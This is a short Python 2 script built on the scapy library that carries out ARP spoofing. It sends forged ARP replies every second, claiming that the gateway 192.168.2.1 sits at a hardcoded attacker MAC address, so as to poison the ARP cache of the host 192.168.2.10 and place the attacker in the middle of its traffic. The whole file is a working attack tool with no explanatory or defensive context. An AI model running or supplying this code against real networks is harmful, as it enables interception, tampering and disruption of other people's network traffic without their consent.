#!/usr/bin/env python
import sys
from scapy.all import *

conf.verb = 0

op = 2
attacker_mac = '90:b1:1c:99:e0:3c'
gateway = '192.168.2.1'
target_ip = '192.168.2.10'
arp = ARP(op=op, psrc=gateway, pdst=target_ip, hwsrc=attacker_mac)

print "Arp Spoof started.."
try:
    while True:
        send(arp, iface='eno1')
        time.sleep(1)
except KeyboardInterrupt:
    print "Arp spoof finished.."
